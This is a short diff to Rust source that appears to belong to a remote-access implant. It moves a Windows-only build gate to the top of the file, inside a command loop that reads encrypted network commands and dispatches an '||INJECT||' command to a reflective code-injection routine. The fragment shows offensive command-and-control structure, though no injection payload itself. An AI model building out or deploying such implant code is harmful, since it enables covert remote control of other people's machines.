@@ -1,3 +1,5 @@
+#![cfg(windows)]
+
 use rand::rngs::OsRng;
 use simple_crypt::{decrypt, encrypt};
 use std::{
@@ -110,8 +112,7 @@ fn attach() {
                             shared_secret,
                         );
                     } else if command.starts_with("||INJECT||") {
-                        #[cfg(windows)]
-                        inject::reflective_inject(&mut stream, command, shared_secret);
+                                                inject::reflective_inject(&mut stream, command, shared_secret);
                     } else if command_clone.starts_with("||EXIT||") {
                         exit(1);
                     } else {
